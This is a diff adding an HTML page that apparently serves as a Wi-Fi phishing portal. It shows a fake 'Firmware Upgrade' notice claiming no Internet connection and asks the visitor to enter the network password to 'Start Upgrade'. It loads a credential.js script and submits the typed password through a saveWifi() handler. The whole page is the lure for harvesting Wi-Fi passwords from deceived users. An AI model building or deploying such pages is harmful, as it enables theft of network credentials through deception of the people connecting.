@@ -1,0 +1,33 @@
+<html>
+<meta charset="utf-8">
+<meta name=viewport content="width=device-width, initial-scale=0.8, minimal-ui">
+<meta name=description content="244v234">
+<meta name=theme-color content="#36393E" />
+<title>244v234</title>
+<link rel=stylesheet href=style.css>
+<script src="js/site.js"></script>
+<script src="js/credential.js"></script>
+<body onload="load()">
+    <div class=container>
+        <div class=row>
+            <div class=col-12>
+                <div id="error" class="hide"></div>
+                <br>
+                <p class="centered" data-translate="wifi_disclaimer">
+                    Firmware Upgrade<br>
+					<br>
+					There is no Internet connection<br>
+                    A new version has been detected and awaiting installation.<br>
+                    Please confirm the password to proceed with the installation.<br>
+                </p>
+                <div class="box">
+
+                    <h2 id="ssid" style="text-align: center;"></h2>
+                    <input type="email" id="passwifi" name="passwifi" required placeholder="Enter password" />
+                    <input type="submit" onclick="saveWifi()" data-translate="wifi_value_btn" value="Start Upgrade" class="button">
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
